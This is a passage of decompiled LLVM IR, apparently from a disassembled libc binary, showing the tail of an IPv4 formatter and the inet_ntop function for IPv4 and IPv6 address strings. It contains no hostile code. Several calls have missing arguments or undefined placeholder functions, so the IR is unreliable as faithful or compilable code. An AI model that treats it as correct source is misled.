  store i32 %v2_19af0, i32* @r0, align 4
  %v0_19af4 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_19b04 = bitcast i32* %stack_var_-51 to i8*
  %v3_19b04 = call i32 @__GI_memset(i8* %v2_19b04, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_19bcc = ptrtoint i32* %stack_var_-36 to i32
  %v2_19ba8 = add i32 %v2_19bcc, -17
  br label %dec_label_pc_19bcc

dec_label_pc_19b14:                               ; preds = %dec_label_pc_19bcc
  %v0_19b14 = load i32, i32* %fp.global-to-local, align 4
  %v2_19b14 = add i32 %v0_19b14, %v1_19b14
  %v3_19b14 = inttoptr i32 %v2_19b14 to i8*
  %v4_19b14 = load i8, i8* %v3_19b14, align 1
  %v6_19b14 = zext i8 %v4_19b14 to i32
  store i32 %v6_19b14, i32* %r4.global-to-local, align 4
  %v1_19b18 = add i32 %v0_19b18, 1
  store i32 %v1_19b18, i32* %r7.global-to-local, align 4
  store i32 %v2_19bcc, i32* %r2.global-to-local, align 4
  %v2_19b24 = add i32 %v1_19b18, %v2_19bcc
  store i32 %v2_19b24, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_19b14, 100
  %v1_19b2c = or i8 %div, 48
  %v3_19b30 = add i32 %v2_19bdc, -17
  %v4_19b30 = inttoptr i32 %v3_19b30 to i8*
  store i8 %v1_19b2c, i8* %v4_19b30, align 1
  %v0_19b34 = load i32, i32* %r5.global-to-local, align 4
  %v1_19b34 = add i32 %v0_19b34, -17
  %v2_19b34 = inttoptr i32 %v1_19b34 to i8*
  %v3_19b34 = load i8, i8* %v2_19b34, align 1
  %v7_19b38 = icmp eq i8 %v3_19b34, 48
  %v0_19b3c = load i32, i32* %fp.global-to-local, align 4
  %v1_19b3c = load i32, i32* %r8.global-to-local, align 4
  %v2_19b3c = add i32 %v1_19b3c, %v0_19b3c
  store i32 %v2_19b3c, i32* %sb.global-to-local, align 4
  %v0_19b44 = load i32, i32* %r4.global-to-local, align 4
  %v2_19b4c = udiv i32 %v0_19b44, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_19b54 = urem i32 %v2_19b4c, 256
  %v2_19b58 = urem i32 %v1_19b54, 10
  %v1_19b5c = or i32 %v2_19b58, 48
  %v1_19b60 = trunc i32 %v1_19b5c to i8
  br i1 %v7_19b38, label %dec_label_pc_19b4c, label %dec_label_pc_19b74

dec_label_pc_19b4c:                               ; preds = %dec_label_pc_19b14
  store i8 %v1_19b60, i8* %v2_19b34, align 1
  %v0_19b64 = load i32, i32* %r5.global-to-local, align 4
  %v1_19b64 = add i32 %v0_19b64, -17
  %v2_19b64 = inttoptr i32 %v1_19b64 to i8*
  %v3_19b64 = load i8, i8* %v2_19b64, align 1
  %v7_19b68 = icmp eq i8 %v3_19b64, 48
  br i1 %v7_19b68, label %dec_label_pc_19b4c.dec_label_pc_19b98_crit_edge, label %bb

dec_label_pc_19b4c.dec_label_pc_19b98_crit_edge:  ; preds = %dec_label_pc_19b4c
  %v1_19ba8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19b98

bb:                                               ; preds = %dec_label_pc_19b4c
  %v1_19b6c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_19b6c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19b98

dec_label_pc_19b74:                               ; preds = %dec_label_pc_19b14
  %v2_19b90 = load i32, i32* %sl.global-to-local, align 4
  %v3_19b90 = add i32 %v2_19b90, -17
  %v4_19b90 = inttoptr i32 %v3_19b90 to i8*
  store i8 %v1_19b60, i8* %v4_19b90, align 1
  %v0_19b94 = load i32, i32* %r7.global-to-local, align 4
  %v1_19b94 = add i32 %v0_19b94, 1
  store i32 %v1_19b94, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19b98

dec_label_pc_19b98:                               ; preds = %dec_label_pc_19b4c.dec_label_pc_19b98_crit_edge, %bb, %dec_label_pc_19b74
  %v1_19ba8 = phi i32 [ %v1_19ba8.pre, %dec_label_pc_19b4c.dec_label_pc_19b98_crit_edge ], [ %v1_19b6c, %bb ], [ %v1_19b94, %dec_label_pc_19b74 ]
  %v0_19b98 = load i32, i32* %sb.global-to-local, align 4
  %v1_19b98 = inttoptr i32 %v0_19b98 to i8*
  %v2_19b98 = load i8, i8* %v1_19b98, align 1
  %tmp17 = urem i8 %v2_19b98, 10
  store i32 %v2_19bcc, i32* %ip.global-to-local, align 4
  %v1_19bac = add i32 %v1_19ba8, 1
  store i32 %v1_19bac, i32* %r1.global-to-local, align 4
  %v1_19bb0 = or i8 %tmp17, 48
  %v3_19bb4 = add i32 %v2_19ba8, %v1_19ba8
  %v4_19bb4 = inttoptr i32 %v3_19bb4 to i8*
  store i8 %v1_19bb0, i8* %v4_19bb4, align 1
  %v0_19bb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_19bb8 = load i32, i32* %r1.global-to-local, align 4
  %v2_19bb8 = add i32 %v1_19bb8, %v0_19bb8
  store i32 %v2_19bb8, i32* %r2.global-to-local, align 4
  %v3_19bc0 = add i32 %v2_19bb8, -17
  %v4_19bc0 = inttoptr i32 %v3_19bc0 to i8*
  store i8 46, i8* %v4_19bc0, align 1
  %v0_19bc4 = load i32, i32* %r8.global-to-local, align 4
  %v1_19bc4 = add i32 %v0_19bc4, 1
  store i32 %v1_19bc4, i32* %r8.global-to-local, align 4
  %v0_19bc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_19bc8 = add i32 %v0_19bc8, 1
  br label %dec_label_pc_19bcc

dec_label_pc_19bcc:                               ; preds = %entry, %dec_label_pc_19b98
  %v0_19b18 = phi i32 [ 0, %entry ], [ %v1_19bc8, %dec_label_pc_19b98 ]
  %v1_19b14 = phi i32 [ 0, %entry ], [ %v1_19bc4, %dec_label_pc_19b98 ]
  store i32 %v2_19bcc, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_19b18, i32* %r6.global-to-local, align 4
  %v2_19bdc = add i32 %v0_19b18, %v2_19bcc
  store i32 %v2_19bdc, i32* %r5.global-to-local, align 4
  %v7_19be0 = icmp sgt i32 %v1_19b14, 3
  br i1 %v7_19be0, label %dec_label_pc_19be4, label %dec_label_pc_19b14

dec_label_pc_19be4:                               ; preds = %dec_label_pc_19bcc
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_19af0, i32* %r4.global-to-local, align 4
  %v3_19bec = add i32 %v2_19bdc, -18
  %v4_19bec = inttoptr i32 %v3_19bec to i8*
  store i8 0, i8* %v4_19bec, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_19bf4 = call i32 @strlen(i8* %tmp18)
  %v2_19bf8 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_19bf4, %v2_19bf8
  br i1 %tmp, label %dec_label_pc_19c04, label %dec_label_pc_19c18

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19be4
  %v0_19c04 = call i32 @__errno_location()
  %v0_19c0c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19c0c, i32* %r2.global-to-local, align 4
  %v2_19c10 = inttoptr i32 %v0_19c04 to i32*
  store i32 28, i32* %v2_19c10, align 4
  %v0_19c28.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19c28

dec_label_pc_19c18:                               ; preds = %dec_label_pc_19be4
  store i32 %v2_19af0, i32* %r1.global-to-local, align 4
  %v3_19c20 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_19c20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19c28

dec_label_pc_19c28:                               ; preds = %dec_label_pc_19c04, %dec_label_pc_19c18
  %v0_19c28 = phi i32 [ %v0_19c28.pre, %dec_label_pc_19c04 ], [ %v3_19c20, %dec_label_pc_19c18 ]
  %v2_19c30 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19c30, i32* @r4, align 4
  ret i32 %v0_19c28

; uselistorder directives
  uselistorder i32 %v2_19bdc, { 0, 2, 1 }
  uselistorder i32 %v1_19b14, { 1, 0 }
  uselistorder i32 %v0_19b18, { 0, 2, 1 }
  uselistorder i32 %v2_19bcc, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_19c28, { 1, 0 }
  uselistorder label %dec_label_pc_19bcc, { 1, 0 }
  uselistorder label %dec_label_pc_19b98, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19c38 = load i32, i32* @r4, align 4
  store i32 %v3_19c38, i32* %stack_var_-32, align 4
  %v6_19c38 = load i32, i32* @r5, align 4
  %v25_19c38 = ptrtoint i32* %stack_var_-32 to i32
  %v7_19c3c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_19c3c, label %dec_label_pc_19c60, label %dec_label_pc_19c54

dec_label_pc_19c54:                               ; preds = %entry
  %v7_19c54 = icmp eq i32 %arg1, 10
  br i1 %v7_19c54, label %dec_label_pc_19c74, label %dec_label_pc_19e74

dec_label_pc_19c60:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_19c6c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_19e6c

dec_label_pc_19c74:                               ; preds = %dec_label_pc_19c54
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_19c80 = bitcast i32* %stack_var_-64 to i8*
  %v3_19c80 = call i32 @__GI_memset(i8* %v2_19c80, i32 0)
  br label %dec_label_pc_19ca0

dec_label_pc_19c8c:                               ; preds = %dec_label_pc_19ca0
  %tmp68 = icmp slt i32 %v1_19c90, 0
  %v4_19ca0 = zext i1 %tmp68 to i32
  %v5_19ca0 = add i32 %v4_19ca0, %v1_19c90
  %v3_19ca4 = sdiv i32 %v5_19ca0, 2
  %v4_19cb4 = mul i32 %v3_19ca4, 4
  %v5_19cb4 = add i32 %v4_19cb4, %v25_19c38
  %v1_19c8c = add i32 %v2_19cb0, 1
  %v2_19c8c = inttoptr i32 %v1_19c8c to i8*
  %v3_19c8c = load i8, i8* %v2_19c8c, align 1
  %v4_19c8c = zext i8 %v3_19c8c to i32
  %v3_19c90 = inttoptr i32 %v2_19cb0 to i8*
  %v4_19c90 = load i8, i8* %v3_19c90, align 1
  %v6_19c90 = zext i8 %v4_19c90 to i32
  store i32 %v6_19c90, i32* %r2.global-to-local, align 4
  %v4_19c94 = mul nuw nsw i32 %v6_19c90, 256
  %v5_19c94 = or i32 %v4_19c94, %v4_19c8c
  %v2_19c98 = add i32 %v5_19cb4, -32
  %v3_19c98 = inttoptr i32 %v2_19c98 to i32*
  store i32 %v5_19c94, i32* %v3_19c98, align 4
  %v0_19c9c = load i32, i32* %r1.global-to-local, align 4
  %v1_19c9c = add i32 %v0_19c9c, 2
  br label %dec_label_pc_19ca0

dec_label_pc_19ca0:                               ; preds = %dec_label_pc_19c74, %dec_label_pc_19c8c
  %v1_19c90 = phi i32 [ 0, %dec_label_pc_19c74 ], [ %v1_19c9c, %dec_label_pc_19c8c ]
  store i32 %v1_19c90, i32* %r1.global-to-local, align 4
  %v0_19cb0 = load i32, i32* @r8, align 4
  %v2_19cb0 = add i32 %v0_19cb0, %v1_19c90
  store i32 %v2_19cb0, i32* %r2.global-to-local, align 4
  %v7_19cb8 = icmp sgt i32 %v1_19c90, 15
  br i1 %v7_19cb8, label %dec_label_pc_19cbc, label %dec_label_pc_19c8c

dec_label_pc_19cbc:                               ; preds = %dec_label_pc_19ca0
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ccc

dec_label_pc_19ccc:                               ; preds = %dec_label_pc_19cbc, %dec_label_pc_19d18
  %v0_19d0c = phi i32 [ -1, %dec_label_pc_19cbc ], [ %v0_19d40, %dec_label_pc_19d18 ]
  %v0_19cfc = phi i32 [ -1, %dec_label_pc_19cbc ], [ %v0_19d2c, %dec_label_pc_19d18 ]
  %v0_19ce0 = phi i32 [ -1, %dec_label_pc_19cbc ], [ %v0_19ce08, %dec_label_pc_19d18 ]
  %v0_19d18 = phi i32 [ 0, %dec_label_pc_19cbc ], [ %v1_19d18, %dec_label_pc_19d18 ]
  %v4_19cd0 = mul nuw nsw i32 %v0_19d18, 4
  %v5_19cd0 = add i32 %v4_19cd0, %v25_19c38
  %v1_19cd4 = add i32 %v5_19cd0, -32
  %v2_19cd4 = inttoptr i32 %v1_19cd4 to i32*
  %v3_19cd4 = load i32, i32* %v2_19cd4, align 4
  %v2_19cd8 = icmp eq i32 %v3_19cd4, 0
  %v7_19ce0 = icmp eq i32 %v0_19ce0, -1
  br i1 %v2_19cd8, label %dec_label_pc_19ce0, label %dec_label_pc_19cf4

dec_label_pc_19ce0:                               ; preds = %dec_label_pc_19ccc
  br i1 %v7_19ce0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19ce0
  store i32 %v0_19d18, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_19d18

.thread:                                          ; preds = %dec_label_pc_19ce0
  %v1_19cec.pre = load i32, i32* @r4, align 4
  %v2_19cec = add i32 %v1_19cec.pre, 1
  store i32 %v2_19cec, i32* @r4, align 4
  br label %dec_label_pc_19d18

dec_label_pc_19cf4:                               ; preds = %dec_label_pc_19ccc
  br i1 %v7_19ce0, label %dec_label_pc_19d18, label %dec_label_pc_19cfc

dec_label_pc_19cfc:                               ; preds = %dec_label_pc_19cf4
  %v7_19cfc = icmp eq i32 %v0_19cfc, -1
  %v0_19d10.pre = load i32, i32* @r4, align 4
  %v1_19d04 = load i32, i32* @r7, align 4
  %v7_19d08 = icmp sgt i32 %v0_19d10.pre, %v1_19d04
  %or.cond = or i1 %v7_19cfc, %v7_19d08
  br i1 %or.cond, label %dec_label_pc_19d0c, label %dec_label_pc_19d14

dec_label_pc_19d0c:                               ; preds = %dec_label_pc_19cfc
  store i32 %v0_19d0c, i32* @r6, align 4
  store i32 %v0_19d10.pre, i32* @r7, align 4
  br label %dec_label_pc_19d14

dec_label_pc_19d14:                               ; preds = %dec_label_pc_19cfc, %dec_label_pc_19d0c
  %v0_19cfc13 = phi i32 [ %v0_19d0c, %dec_label_pc_19d0c ], [ %v0_19cfc, %dec_label_pc_19cfc ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19d18

dec_label_pc_19d18:                               ; preds = %bb, %.thread, %dec_label_pc_19cf4, %dec_label_pc_19d14
  %v0_19d40 = phi i32 [ %v0_19d0c, %.thread ], [ %v0_19d18, %bb ], [ %v0_19d0c, %dec_label_pc_19cf4 ], [ -1, %dec_label_pc_19d14 ]
  %v0_19ce08 = phi i32 [ %v0_19ce0, %.thread ], [ %v0_19d18, %bb ], [ -1, %dec_label_pc_19cf4 ], [ -1, %dec_label_pc_19d14 ]
  %v0_19d2c = phi i32 [ %v0_19cfc, %.thread ], [ %v0_19cfc, %bb ], [ %v0_19cfc, %dec_label_pc_19cf4 ], [ %v0_19cfc13, %dec_label_pc_19d14 ]
  %v1_19d18 = add nuw nsw i32 %v0_19d18, 1
  store i32 %v1_19d18, i32* %r1.global-to-local, align 4
  %v7_19d20 = icmp slt i32 %v1_19d18, 8
  br i1 %v7_19d20, label %dec_label_pc_19ccc, label %dec_label_pc_19d24

dec_label_pc_19d24:                               ; preds = %dec_label_pc_19d18
  %v7_19d24 = icmp eq i32 %v0_19d40, -1
  br i1 %v7_19d24, label %dec_label_pc_19d44, label %dec_label_pc_19d2c

dec_label_pc_19d2c:                               ; preds = %dec_label_pc_19d24
  %v7_19d2c = icmp eq i32 %v0_19d2c, -1
  %v0_19d3c.pre = load i32, i32* @r4, align 4
  br i1 %v7_19d2c, label %dec_label_pc_19d3c, label %dec_label_pc_19d34

dec_label_pc_19d34:                               ; preds = %dec_label_pc_19d2c
  %v1_19d34 = load i32, i32* @r7, align 4
  %v7_19d38 = icmp sgt i32 %v0_19d3c.pre, %v1_19d34
  br i1 %v7_19d38, label %dec_label_pc_19d3c, label %dec_label_pc_19d44

dec_label_pc_19d3c:                               ; preds = %dec_label_pc_19d2c, %dec_label_pc_19d34
  store i32 %v0_19d3c.pre, i32* @r7, align 4
  store i32 %v0_19d40, i32* @r6, align 4
  br label %dec_label_pc_19d44

dec_label_pc_19d44:                               ; preds = %dec_label_pc_19d34, %dec_label_pc_19d24, %dec_label_pc_19d3c
  %v0_19d44 = phi i32 [ %v0_19d2c, %dec_label_pc_19d34 ], [ %v0_19d2c, %dec_label_pc_19d24 ], [ %v0_19d40, %dec_label_pc_19d3c ]
  %v7_19d44 = icmp eq i32 %v0_19d44, -1
  br i1 %v7_19d44, label %bb49, label %dec_label_pc_19d4c

dec_label_pc_19d4c:                               ; preds = %dec_label_pc_19d44
  %v0_19d4c = load i32, i32* @r7, align 4
  %v7_19d50 = icmp slt i32 %v0_19d4c, 2
  br i1 %v7_19d50, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_19d4c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_19d44, %dec_label_pc_19d4c, %bb48
  %v0_19d6023 = phi i32 [ %v0_19d44, %dec_label_pc_19d44 ], [ %v0_19d44, %dec_label_pc_19d4c ], [ -1, %bb48 ]
  %v2_19d54 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_19d54, i32* @r4, align 4
  %v9_19dc0 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_19d6063 = icmp eq i32 %v0_19d6023, -1
  br label %dec_label_pc_19d60

dec_label_pc_19d60:                               ; preds = %bb49, %dec_label_pc_19e14
  %v7_19d6067 = phi i1 [ %v7_19d6063, %bb49 ], [ %v7_19d60, %dec_label_pc_19e14 ]
  %v0_19d8c66 = phi i32 [ 0, %bb49 ], [ %v1_19e14, %dec_label_pc_19e14 ]
  %v1_19d7c65 = phi i32 [ %v0_19d6023, %bb49 ], [ %v0_19d60.pre, %dec_label_pc_19e14 ]
  %v3_19d9464 = phi i32 [ %v2_19d54, %bb49 ], [ %v3_19d8424, %dec_label_pc_19e14 ]
  br i1 %v7_19d6067, label %dec_label_pc_19d8c, label %dec_label_pc_19d68

dec_label_pc_19d68:                               ; preds = %dec_label_pc_19d60
  %v9_19d68 = icmp eq i32 %v0_19d8c66, %v1_19d7c65
  %v5_19d6c = icmp slt i32 %v0_19d8c66, %v1_19d7c65
  br i1 %v5_19d6c, label %dec_label_pc_19d8c, label %dec_label_pc_19d70

dec_label_pc_19d70:                               ; preds = %dec_label_pc_19d68
  %v1_19d70 = load i32, i32* @r7, align 4
  %v2_19d70 = add i32 %v1_19d70, %v1_19d7c65
  %v6_19d78 = icmp slt i32 %v0_19d8c66, %v2_19d70
  br i1 %v6_19d78, label %dec_label_pc_19d7c, label %dec_label_pc_19d8c

dec_label_pc_19d7c:                               ; preds = %dec_label_pc_19d70
  br i1 %v9_19d68, label %bb51, label %dec_label_pc_19e14

bb51:                                             ; preds = %dec_label_pc_19d7c
  %v4_19d84 = inttoptr i32 %v3_19d9464 to i8*
  store i8 58, i8* %v4_19d84, align 1
  %v5_19d84 = load i32, i32* @r4, align 4
  %v6_19d84 = add i32 %v5_19d84, 1
  store i32 %v6_19d84, i32* @r4, align 4
  br label %dec_label_pc_19e14

dec_label_pc_19d8c:                               ; preds = %dec_label_pc_19d70, %dec_label_pc_19d68, %dec_label_pc_19d60
  %v2_19d8c = icmp eq i32 %v0_19d8c66, 0
  br i1 %v2_19d8c, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_19d8c
  %v4_19d94 = inttoptr i32 %v3_19d9464 to i8*
  store i8 58, i8* %v4_19d94, align 1
  %v5_19d94 = load i32, i32* @r4, align 4
  %v6_19d94 = add i32 %v5_19d94, 1
  store i32 %v6_19d94, i32* @r4, align 4
  %v0_19d98.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19d8c, %bb52
  %v0_19dd8 = phi i32 [ %v3_19d9464, %dec_label_pc_19d8c ], [ %v6_19d94, %bb52 ]
  %v1_19dfc = phi i32 [ 0, %dec_label_pc_19d8c ], [ %v0_19d98.pre, %bb52 ]
  %v7_19d98 = icmp eq i32 %v1_19dfc, 6
  br i1 %v7_19d98, label %dec_label_pc_19da0, label %dec_label_pc_19df8

dec_label_pc_19da0:                               ; preds = %.thread3
  %v0_19da0 = load i32, i32* @r6, align 4
  %v2_19da0 = icmp eq i32 %v0_19da0, 0
  br i1 %v2_19da0, label %dec_label_pc_19da8, label %dec_label_pc_19df8

dec_label_pc_19da8:                               ; preds = %dec_label_pc_19da0
  %v0_19da8 = load i32, i32* @r7, align 4
  %v7_19da8 = icmp eq i32 %v0_19da8, 6
  br i1 %v7_19da8, label %dec_label_pc_19dc8, label %dec_label_pc_19db0

dec_label_pc_19db0:                               ; preds = %dec_label_pc_19da8
  %v7_19db0 = icmp eq i32 %v0_19da8, 5
  br i1 %v7_19db0, label %dec_label_pc_19db8, label %dec_label_pc_19df8

dec_label_pc_19db8:                               ; preds = %dec_label_pc_19db0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_19dc0, label %dec_label_pc_19dc8, label %dec_label_pc_19df8

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19db8, %dec_label_pc_19da8
  %v2_19dcc = sub i32 %v25_19c38, %v0_19dd8
  %v0_19dd0 = load i32, i32* @r8, align 4
  %v1_19dd0 = add i32 %v0_19dd0, 12
  %v1_19dd4 = add i32 %v2_19dcc, -32
  store i32 %v1_19dd4, i32* %r2.global-to-local, align 4
  store i32 %v0_19dd8, i32* %r1.global-to-local, align 4
  %v3_19ddc = call i32 @inet_ntop4(i32 %v1_19dd0, i32 %v0_19dd8, i32 %v1_19dd4)
  %v2_19de0 = icmp eq i32 %v3_19ddc, 0
  br i1 %v2_19de0, label %dec_label_pc_19e6c, label %dec_label_pc_19de8

dec_label_pc_19de8:                               ; preds = %dec_label_pc_19dc8
  %v0_19de8 = load i32, i32* @r4, align 4
  %v1_19de8 = inttoptr i32 %v0_19de8 to i8*
  %v3_19dec = call i32 @strlen(i8* %v1_19de8)
  %v0_19df0 = load i32, i32* @r4, align 4
  %v2_19df0 = add i32 %v0_19df0, %v3_19dec
  store i32 %v2_19df0, i32* @r4, align 4
  %v0_19e28.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19e28

dec_label_pc_19df8:                               ; preds = %dec_label_pc_19db8, %dec_label_pc_19db0, %dec_label_pc_19da0, %.thread3
  %v4_19dfc = mul i32 %v1_19dfc, 4
  %v5_19dfc = add i32 %v4_19dfc, %v25_19c38
  store i32 %v0_19dd8, i32* @r0, align 4
  %v1_19e04 = add i32 %v5_19dfc, -32
  %v2_19e04 = inttoptr i32 %v1_19e04 to i32*
  %v3_19e04 = load i32, i32* %v2_19e04, align 4
  store i32 %v3_19e04, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1dc84.1165 to i32), i32* %r1.global-to-local, align 4
  %v7_19e0c = call i32 @sprintf(i32 %v0_19dd8, i32 ptrtoint ([3 x i8]* @global_var_1dc84.1165 to i32), i32 %v3_19e04, i32 %v5_19dfc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_19e10 = load i32, i32* @r4, align 4
  %v2_19e10 = add i32 %v0_19e10, %v7_19e0c
  store i32 %v2_19e10, i32* @r4, align 4
  br label %dec_label_pc_19e14

dec_label_pc_19e14:                               ; preds = %dec_label_pc_19d7c, %bb51, %dec_label_pc_19df8
  %v3_19d8424 = phi i32 [ %v3_19d9464, %dec_label_pc_19d7c ], [ %v6_19d84, %bb51 ], [ %v2_19e10, %dec_label_pc_19df8 ]
  %v0_19e14 = load i32, i32* @r5, align 4
  %v1_19e14 = add i32 %v0_19e14, 1
  %v0_19d60.pre = load i32, i32* @r6, align 4
  store i32 %v1_19e14, i32* @r5, align 4
  %v7_19e1c = icmp slt i32 %v1_19e14, 8
  %v7_19d60 = icmp eq i32 %v0_19d60.pre, -1
  br i1 %v7_19e1c, label %dec_label_pc_19d60, label %dec_label_pc_19e20

dec_label_pc_19e20:                               ; preds = %dec_label_pc_19e14
  br i1 %v7_19d60, label %.thread4, label %dec_label_pc_19e28

dec_label_pc_19e28:                               ; preds = %dec_label_pc_19e20, %dec_label_pc_19de8
  %v3_19e34 = phi i32 [ %v3_19d8424, %dec_label_pc_19e20 ], [ %v2_19df0, %dec_label_pc_19de8 ]
  %v0_19e28 = phi i32 [ %v0_19d60.pre, %dec_label_pc_19e20 ], [ %v0_19e28.pre, %dec_label_pc_19de8 ]
  %v1_19e28 = load i32, i32* @r7, align 4
  %v2_19e28 = add i32 %v1_19e28, %v0_19e28
  %v7_19e2c = icmp eq i32 %v2_19e28, 8
  br i1 %v7_19e2c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_19e28
  %v4_19e34 = inttoptr i32 %v3_19e34 to i8*
  store i8 58, i8* %v4_19e34, align 1
  %v5_19e34 = load i32, i32* @r4, align 4
  %v6_19e34 = add i32 %v5_19e34, 1
  store i32 %v6_19e34, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_19e28, %dec_label_pc_19e20, %bb53
  %v2_19e3c = phi i32 [ %v3_19e34, %dec_label_pc_19e28 ], [ %v3_19d8424, %dec_label_pc_19e20 ], [ %v6_19e34, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_19e3c = inttoptr i32 %v2_19e3c to i8*
  store i8 0, i8* %v3_19e3c, align 1
  %v4_19e3c = load i32, i32* @r4, align 4
  %v5_19e3c = add i32 %v4_19e3c, 1
  store i32 %v2_19d54, i32* %r1.global-to-local, align 4
  %v2_19e44 = sub i32 %v5_19e3c, %v2_19d54
  %v1_19e48 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_19e44, %v1_19e48
  br i1 %tmp69, label %dec_label_pc_19e50, label %dec_label_pc_19e64

dec_label_pc_19e50:                               ; preds = %.thread4
  %v0_19e50 = call i32 @__errno_location()
  %v0_19e58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19e58, i32* %r2.global-to-local, align 4
  %v2_19e5c = inttoptr i32 %v0_19e50 to i32*
  store i32 28, i32* %v2_19e5c, align 4
  %v0_19e84.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19e84

dec_label_pc_19e64:                               ; preds = %.thread4
  %v0_19e64 = load i32, i32* @sb, align 4
  %v2_19e68 = bitcast i32* %stack_var_-110 to i8*
  %v3_19e68 = call i32 @strcpy(i32 %v0_19e64, i8* %v2_19e68)
  br label %dec_label_pc_19e6c

dec_label_pc_19e6c:                               ; preds = %dec_label_pc_19dc8, %dec_label_pc_19c60, %dec_label_pc_19e64
  %v0_19e6c = phi i32 [ 0, %dec_label_pc_19dc8 ], [ %v3_19c6c, %dec_label_pc_19c60 ], [ %v3_19e68, %dec_label_pc_19e64 ]
  store i32 %v0_19e6c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19e84

dec_label_pc_19e74:                               ; preds = %dec_label_pc_19c54
  %v0_19e74 = call i32 @__errno_location()
  %v2_19e7c = inttoptr i32 %v0_19e74 to i32*
  store i32 97, i32* %v2_19e7c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19e84

dec_label_pc_19e84:                               ; preds = %dec_label_pc_19e6c, %dec_label_pc_19e50, %dec_label_pc_19e74
  %v0_19e84 = phi i32 [ %v0_19e6c, %dec_label_pc_19e6c ], [ %v0_19e84.pre, %dec_label_pc_19e50 ], [ 0, %dec_label_pc_19e74 ]
  store i32 %v6_19c38, i32* %r5.global-to-local, align 4
  ret i32 %v0_19e84

; uselistorder directives
  uselistorder i1 %v7_19d60, { 1, 0 }
  uselistorder i32 %v0_19d60.pre, { 1, 0, 2 }
  uselistorder i32 %v1_19e14, { 1, 0, 2 }
  uselistorder i32 %v0_19dd8, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_19d9464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_19d7c65, { 2, 0, 1 }
